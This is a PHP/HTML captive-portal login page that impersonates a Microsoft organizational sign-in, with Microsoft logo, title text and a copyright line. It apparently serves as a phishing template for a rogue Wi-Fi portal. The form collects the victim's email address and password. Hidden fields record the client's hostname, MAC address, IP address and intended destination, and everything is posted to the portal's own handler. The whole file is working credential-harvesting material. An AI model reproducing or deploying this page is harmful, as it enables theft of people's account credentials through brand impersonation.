<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <title>Sign In</title>
        
        <script src='assets/js/jquery-3.4.1.min.js'></script>
        <script src='assets/js/jquery-ui.min.js'></script>
        <link href='assets/css/bootstrap.min.css' rel="stylesheet'>
        <script src='assets/js/bootstrap.min.js'></script>
        <link href='assets/css/progress-bar.css' rel="stylesheet'>
        <link rel="stylesheet" href="assets/css/custom.css">
        <link rel="icon" type="image/png" href="assets/images/favicon.ico">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
        <style media="screen">
        @font-face {
          font-family: 'Roboto';
          src: URL('assets/fonts/Roboto-Regular.ttf') format('truetype');
          font-weight: normal;
        }
        @font-face {
          font-family: 'open-sans';
          src: URL('assets/fonts/OpenSans-Regular.ttf') format('truetype');
          font-weight: normal;
        }
        body {
          background-image: url('illustration.jpg');
          height: 100%;
          background-position: center;
          background-repeat: no-repeat;
          background-size: cover;
        }
        </style>
    </head>
    <body>
        <div id='login-app'>
            <div class="login-container">
                <div class='progress-bar-container show-progress'>
                    <div class="progress-bar mdc-linear-progress mdc-linear-progress--indeterminate progress-hidden" style='display:none;'>
                        <div class="mdc-linear-progress mdc-linear-progress--indeterminate">
                            <div class="mdc-linear-progress__buffering-dots"></div>
                            <div class="mdc-linear-progress__buffer"></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__primary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                            <div class="mdc-linear-progress__bar mdc-linear-progress__secondary-bar"><span class="mdc-linear-progress__bar-inner"></span></div>
                        </div>
                    </div>
                </div>
                <div class='login-content' id='login-form'>
                    <div id="logo" title="Microsoft">
                    <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                        <img class="logoImage" id="companyLogo" src="logo.png" alt="Microsoft" width="200" align="left">
                    </svg>
                    </div>
                    <form method="POST" action="/captiveportal/index.php" id='email-form-step'>
                        <br>
                        <br>
                        <h2 class='g-h2'>Sign in with your organizational account</h2>
                        <div class='login-content'>
                            <input name="email" id='email-input' type="text" class='g-input' placeholder="someone@example.com" required>
                            <input name="password" id='password-input' type="password" class='g-input password-input' placeholder="Password" required>
                            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
                            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
                            <input type="hidden" name="target" value="<?=$destination?>">
                            <br>
                            <br>
                            <button class='gbtn-primary' type="submit" onclick="setTimeout(function() { window.location = '/captiveportal/index.php'; }, 1000);">Sign In</button>
                            <div id="footer">
                                <div id="footerLinks" class="floatReverse">
                                     <div><span id="copyright">&#169; 2024 Microsoft</span></div>
                                </div>
                            </div>                   
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </body>
</html>
